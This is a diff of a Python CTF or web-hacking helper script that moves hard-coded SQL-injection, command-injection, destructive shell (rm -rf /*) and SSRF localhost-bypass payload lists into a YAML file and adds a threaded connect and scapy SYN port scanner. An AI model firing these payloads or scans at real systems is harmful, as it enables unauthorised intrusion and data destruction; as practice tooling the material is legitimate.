@@ -1,10 +1,19 @@
 import requests
 import re
 import string, json
-import nmap
 import socket
+import os, platform
+import threading
+from datetime import datetime
+import math
+from tqdm import tqdm
+import time
+import random
+import yaml
+with open ('flag.yml', encoding='UTF8') as file:
+    dictionary = yaml.load(file, Loader=yaml.FullLoader)
 
-host = 'colaf.net'
+host = dictionary['host']
 port = '80'
 url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
@@ -14,42 +23,10 @@ cookies = {
 data = {'cmd': 'ls'
         #'host': '8.8.8.8";cat "/app/flag.py'
         }
-payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
-              'admin\' OR 1 -- -',              # admin' OR 1 -- -
-              'admin\' || \'1',                 # and는 &&, or는 ||로 우회
-              '" OR "" = "',                    # " OR "" = "
-              '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
-              '\'=\'',                          # '='
-              '\'LIKE\'',                       # 'LIKE'
-              '\'=0--+'                         #'=0--+
-              ]
-payloadCommandInjection = [';ls "."',           # ;ls "."
-                           '";ls ".',           # ";ls ".
-                           ';pwd',              # ;pwd
-                           '";pwd "',           # ";pwd "
-                           ';cat /tmp/flag',    # ;cat /tmp/flag
-                           '";cat /tmp/flag'    # ";cat /tmp/flag
-                           ]
-payloadCommand = ['rm ./',
-                  'rm -rf ./*',
-                  'rm -rf /*',
-                  'cp -rf ./* ../',
-                  'cat /',
-                  'clear',
-                  'ping http://localhost',
-                  'whois https://naver.com',
-                  '가나다']
-
-
-payloadLocalhost = ['http://localhost',
-                    'http://vcap.me',
-                    'http://0x7f.0x00.0x00.0x01',
-                    'http://0x7f000001',
-                    'http://2130706433',
-                    'http://Localhost',
-                    'http://127.0.0.255'
-                    'http://127.1',
-                    ]
+payloadSQL = dictionary['payloadSQL']
+payloadCommandInjection = dictionary['payloadCommandInjection'] 
+payloadCommand = dictionary['payloadCommand']
+payloadLocalhost = dictionary['payloadLocalhost']
 ALPHANUMERIC = string.digits + string.ascii_letters
 flag = ''
 def refineResponse(text):
@@ -66,41 +43,168 @@ def printLog(payload, responseText):
     print("payload: " + payload)
     print(response.text)
 ################################ SCAN   #################################
-nmap_scan = nmap.PortScanner()
-ip_regex = re.compile("^\d")
-try:
-    print(str(host.replace(" ", "")))
-    isValidIp = ip_regex.search(host.replace(" ", ""))
-    print(str(isValidIp))
-    if isValidIp:
-        print("ifif")
-        IP = host
+import scapy.all as scapy
+class Scan(threading.Thread):
+    def __init__(self, ipList, portList, method):
+        threading.Thread.__init__(self)
+        self.method = method
+        self.ip_src = socket.gethostbyname(socket.gethostname())
+        self.ipList = ipList
+        self.portList = portList
+        #self.OS = platform.system()
+
+        #if (self.OS == "Windows"):
+        #    self.ping1 = "ping -n 1 "
+        #elif (self.OS =="Linux"):
+        #    self.ping1 = "ping -c 1 "
+        #else:
+        #    self.ping1 = "ping -c 1 "
+
+    def run(self):
+        try:
+            if self.method == "open":
+                for ip_dst in self.ipList:
+                    for port_dst in self.portList:
+                        socket_temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        socket.setdefaulttimeout(1)
+                        result = socket_temp.connect_ex((ip_dst, port_dst))
+                        try:
+                            service = socket.getservbyport(port_dst)
+                        except:
+                            service = "not found"
+                        if result == 0:
+                            print("ip ", ip_dst, ", port ", str(port_dst), " is opened. protocol is ", service)
+                        else:
+                            print("ip ", ip_dst, ", port ", str(port_dst), " is closed. protocol is ", service)
+                        socket_temp.close()
+            elif self.method == "syn":
+                for ip_dst in self.ipList:
+                    for port_dst in self.portList:
+                        port_rand = random.randrange(1024, 65536)
+                        ip = scapy.IP(src=self.ip_src, dst=ip_dst)
+                        tcp = scapy.TCP(sport = port_rand, dport = port_dst, flags="S", seq=12345)
+                        packet = ip/tcp
+                        p = scapy.sr1(packet, inter=1, timeout = 4)
+                        p.show
+                        tcp = scapy.TCP(sport=port_rand, dport = port_dst, flags="R", seq=12347)
+                        packet = ip/tcp
+                        p = scapy.sr1(packet)
+                        p.show()
+        except KeyboardInterrupt:
+            print("Keyboard inturrupt")
+            sys.exit()
+        except socket.gaierror:
+            print("Hostname could not be resolved")
+            sys.exit()
+        except socket.error:
+            print("Could not connect to server")
+            sys.exit()
+
+def urlParser(text):
+    if type(text) is str:
+        texts = [text]
+    elif type(text) is list:
+        texts = text
     else:
-        print("elseelse")
-        IP = socket.gethostbyname(host)
-        print(str(IP))
-except:
-    print("잘못된 host name 입니다.")
-
-port_regex = re.compile("([0-9]+){1, 5}")
-isValidPort = port_regex.search(port.replace(" ", ""))
-if isValidPort:
-    port_min = int(isValidPort.group(1))
-    if isValidPort.group(2):
-        port_max = int(isValidPort.group(2))
+        return []
+    urlList = []
+    for text in texts: 
+        #comma_seperator_regex = re.compile(r'(?:(?:[\d\.\-]*)(?=,\s))|(?:(?<=,\s)(?:[\d\.\-]*))|(\b(?:[\d\.\-]*)\b)')
+        comma_seperator_regex = re.compile(r'(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))(?:\.(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))){3}(?:\-(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))(?:\.(?:(?:25[0-6])|(?:2[0-5]\d)|(?:1\d{2})|(?:\d{1,2}))){3})*')
+        # comma_seperator_regex = re.compile("a")
+        ip_start_regex = re.compile(r'(?:[\d\.]*)(?=\-)')
+        ip_end_regex = re.compile(r'(?<=\-)(?:[\d\.]*)')
+        seperated_by_comma = comma_seperator_regex.findall(text)
+        seperated_by_comma = [url for url in seperated_by_comma if url] # 빈 문자열 제거
+        for line in seperated_by_comma:
+            if '-' in line:
+                start = ip_start_regex.findall(line)[0].split('.')
+                print("start: ", start[0], ", ", start[1], ", ", start[2], ", ", start[3])
+                end = ip_end_regex.findall(line)[0].split('.')
+                print("end: ", end[0], ", ", end[1], ", ", end[2], ", ", end[3])
+                ip = [0, 0, 0, 0]
+                print(type(start[0]))
+                for ip[0] in range(int(start[0]), int(end[0])+1):
+                    for ip[1] in range(int(start[1]), int(end[1])+1):
+                        for ip[2] in range(int(start[2]), int(end[2])+1):
+                            for ip[3] in range(int(start[3]), int(end[3])+1):
+                                ip = list(map(str, ip))
+                                urlList.append('.'.join(ip))
+            else:
+                urlList.append(line)
+    return urlList
+def portParser(text):
+    if type(text) is str:
+        texts = [text]
+    elif type(text) is list:
+        texts = text
     else:
-        port_max = int(isValidPort.group(1))
-else:
-    port_min = 443
-    port_max = 443
+        return []
+    portList = []
+    for text in texts:
+        comma_seperator_regex = re.compile(r'(?:6553[0-5])|(?:655[0-2]\d)|(?:65[0-4]\d{2})|(?:6[0-4]\d{3})|(?:[0-5]\d{4})|(?:\d{1,4})(?:\-(?:(?:6553[0-5])|(?:655[0-2]\d)|(?:65[0-4]\d{2})|(?:6[0-4]\d{3})|(?:[0-5]\d{4})|(?:\d{1,4})))*')
+        port_start_regex = re.compile(r'(?:[\d])*(?=\-)')
+        port_end_regex = re.compile(r'(?<=\-)(?:[\d]*)')
+        seperated_by_comma = comma_seperator_regex.findall(text)
+        seperated_by_comma = [port for port in seperated_by_comma if port] # 빈 문자열 제거
+        print("seperated by comma: ", seperated_by_comma)
+        for text in seperated_by_comma:
+            if '-' in text:
+                start = port_start_regex.findall(text)[0]
+                print("start: ", start)
+                end = port_end_regex.findall(text)[0]
+                print("end: ", end)
+                for port in range(int(start), int(end)+1):
+                    portList.append(port)
+                    print("", str(port), " is joined")
+            else:
+                portList.append(text)
 
-for port in range(port_min, port_max + 1):
-    try:
-        port_condition = nmap_scan.scan(IP, str(port))
-        print(port_condition)
-    except:
-        print(f"{port} 포트는 닫혀있습니다.")
+    portList = list(map(int, portList))
+    return portList
 
+def allScan(method):
+    ip_regex = re.compile("(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}")
+    # port_regex = re.compile("((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))")
+    port_regex = re.compile("\d{1,5}")
+    host = input("host: ")
+    isValidIp = ip_regex.search(host).group(0)
+    isValidPort = True
+    if host == None:
+        ipList = dictionary['ipList']
+    elif not isValidIp:
+        try:
+            ip = socket.gethostbyname(host)
+        except:
+            print('no IP found')
+            return
+    else:
+        ipList = urlParser(host)
+
+    port = input("port: ")
+    if port == None:
+        portList = portParser(dictionary['portList'])
+    else:
+        portList = portParser(port)
+
+    start_time = datetime.now()
+
+    print("ipList: ", ipList)
+    print("portList: ", portList)
+    n_thread = 4
+    if method == "open":
+        for index in range(n_thread):
+            portSubList = portList[index::n_thread]
+            scan = Scan(ipList, portSubList, method)
+            scan.start()
+    elif method == "syn":
+        for index in range(n_thread):
+            portSubList = portList[index::n_thread]
+            scan = Scan(ipList, portSubList, method)
+            scan.start()
+
+
+allScan("open")
 ################################ CANVAS  ################################
 def existDetector(text):
     regex_exist = re.compile('exists')
